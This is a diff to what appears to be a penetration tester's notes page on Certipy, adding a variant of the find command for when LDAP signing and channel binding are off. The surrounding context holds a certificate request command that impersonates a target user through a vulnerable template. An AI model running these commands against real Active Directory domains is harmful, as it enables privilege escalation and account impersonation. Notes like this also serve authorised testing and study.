@@ -8,6 +8,10 @@ A tool used to generate certificates from a [[Active Directory Certificate Templ
 certipy find -u user@dns_name -p 'password' -dc-ip 10.0.1.16
 ```
 You can see the possible priv-esc attacks in the `[!] Vulnerabilities` heading
+### Certipy When no LDAP
+```
+certipy find -u $USER@$DOMAIN -p $USERPASS -dc-ip $DCIP -ldap-port 389 -no-ldap-channel-binding -no-ldap-signing -ldap-scheme ldap
+```
 # Generation
 ```
 certipy req -u <user> -p <password> -ca <CertificateAuthority> -target <CAHostname> -template <vulnTemplate> -upn <targetUsername> -dns <DNSServer
